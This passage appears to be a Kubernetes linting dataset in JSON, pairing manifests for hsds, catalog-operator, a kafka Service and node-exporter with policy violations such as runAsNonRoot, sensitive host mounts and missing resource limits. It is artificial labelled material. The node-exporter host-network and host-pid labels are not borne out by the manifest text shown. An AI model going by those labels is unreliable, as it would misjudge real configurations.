configMap:\n          name: hsds-override\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dn\" does not have a read-only root file system"
  },
  {
    "id": "2220",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sn\" does not have a read-only root file system"
  },
  {
    "id": "2221",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dn\" is not set to runAsNonRoot"
  },
  {
    "id": "2222",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sn\" is not set to runAsNonRoot"
  },
  {
    "id": "2223",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dn\" has cpu request 0"
  },
  {
    "id": "2224",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sn\" has cpu request 0"
  },
  {
    "id": "2225",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dn\" has memory limit 0"
  },
  {
    "id": "2226",
    "manifest_path": "data/manifests/the_stack_sample/sample_0545.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n      - name: dn\n        image: hdfgroup/hsds\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sn\" has memory limit 0"
  },
  {
    "id": "2227",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"catalog-operator\" does not have a read-only root file system"
  },
  {
    "id": "2228",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"olm-operator-serviceaccount\" not found"
  },
  {
    "id": "2229",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"catalog-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "2230",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"catalog-operator\" has cpu request 0"
  },
  {
    "id": "2231",
    "manifest_path": "data/manifests/the_stack_sample/sample_0546.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        - -namespace\n        - operator-lifecycle-manager\n        - -debug\n        image: quay.io/coreos/catalog@sha256:8fc933e660a5b143bce7a5e4cb1606630fa9497cc252a7e47e0def3c18268f45\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"catalog-operator\" has memory limit 0"
  },
  {
    "id": "2232",
    "manifest_path": "data/manifests/the_stack_sample/sample_0549.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: kafka-target-consumer\n    app.kubernetes.io/component: kafka-target-consumer\n    app.kubernetes.io/instance: kafka-target-consumer\n  name: kafka-target-consumer\nspec:\n  ports:\n  - name: 8080-tcp\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  - name: 8443-tcp\n    port: 8443\n    protocol: TCP\n    targetPort: 8443\n  - name: 8778-tcp\n    port: 8778\n    protocol: TCP\n    targetPort: 8778\n  selector:\n    deployment: kafka-target-consumer\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[deployment:kafka-target-consumer])"
  },
  {
    "id": "2233",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "2234",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "2235",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-exporter\" does not have a read-only root file system"
  },
  {
    "id": "2236",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node-exporter\" is not set to runAsNonRoot"
  },
  {
    "id": "2237",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/\" is mounted on container \"node-exporter\""
  },
  {
    "id": "2238",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/proc\" is mounted on container \"node-exporter\""
  },
  {
    "id": "2239",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/sys\" is mounted on container \"node-exporter\""
  },
  {
    "id": "2240",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"node-exporter\" has cpu request 0"
  },
  {
    "id": "2241",
    "manifest_path": "data/manifests/the_stack_sample/sample_0550.yaml",
